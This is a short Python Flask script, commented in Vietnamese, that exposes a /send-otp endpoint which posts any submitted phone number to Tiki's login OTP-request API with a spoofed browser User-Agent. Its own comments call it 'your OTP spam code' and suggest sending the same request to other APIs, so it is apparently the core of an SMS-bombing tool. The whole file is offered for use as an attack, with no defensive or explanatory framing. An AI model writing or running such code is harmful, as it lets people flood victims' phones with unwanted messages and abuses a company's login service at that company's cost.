from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

@app.route('/send-otp', methods=['POST'])
def send_otp():
    data = request.get_json()
    phone = data.get('phone')

    if not phone:
        return jsonify({"message": "Vui lòng nhập số điện thoại"}), 400
    
    try:
        # Đoạn code spam OTP của bạn
        url = "https://api.tiki.vn/v2/customers/login/otp-request"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"
        }
        json_data = {
            "phone_number": phone,
            "return_url": "https://tiki.vn",
            "client_id": "0"
        }
        response = requests.post(url, headers=headers, json=json_data)

        # Tương tự, gửi đến các API khác nếu cần

        return jsonify({"message": f"OTP đã được gửi tới {phone}!"}), 200
    except Exception as e:
        return jsonify({"message": "Đã có lỗi xảy ra trong quá trình gửi OTP"}), 500

if __name__ == '__main__':
    app.run(debug=True)
